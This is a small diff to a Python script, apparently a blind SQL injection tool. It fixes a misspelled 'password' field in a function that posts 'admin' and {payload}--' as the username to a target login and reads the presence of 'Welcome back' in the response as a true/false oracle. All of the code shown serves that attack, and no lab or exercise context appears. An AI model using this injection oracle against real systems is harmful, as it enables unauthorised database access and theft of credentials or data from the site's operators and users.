@@ -7,7 +7,7 @@ needle = "Welcome back"
 
 def injected_query(payload):
     global total_queries
-    r = requests.post(target , data = {"username" : "admin' and {}--".format(payload), "passowrd":"password"})
+    r = requests.post(target , data = {"username" : "admin' and {}--".format(payload), "password":"password"})
     total_queries += 1
     return needle.encode() not in r.content
 
